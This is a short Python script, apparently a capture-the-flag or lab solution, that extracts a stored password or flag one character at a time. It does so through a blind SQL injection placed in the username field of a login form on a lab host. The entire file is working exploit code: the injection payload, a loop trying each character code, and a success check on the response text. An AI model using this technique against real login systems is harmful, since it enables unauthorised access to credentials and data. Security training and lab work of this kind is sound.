import requests
from sys import stdout
import urllib3
urllib3.disable_warnings()
print("[+] brute force")

url = "https://f3b7be27c52b4407a8d5e566eac6614b-0-dba482f-80.vlab.uit.edu.vn/index.php"
flag = ''

print('[+] find flag:')
for i in range(50):
    l = 33
    r = 127
    m = (l + r)/2
    for k in range(33, 127):
        password = "123"
        username = f"admin' and ascii(substr(password,{i},1))={k} -- -"
        login = 'Login'
        data = {'username': username,
                'password': password,
                'login': login}
        x = requests.post(url, data=data, verify=False, proxies={
            "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"})

        if "Do you believe" in x.text:
            flag += chr(k)
            print(chr(k))

print(flag)
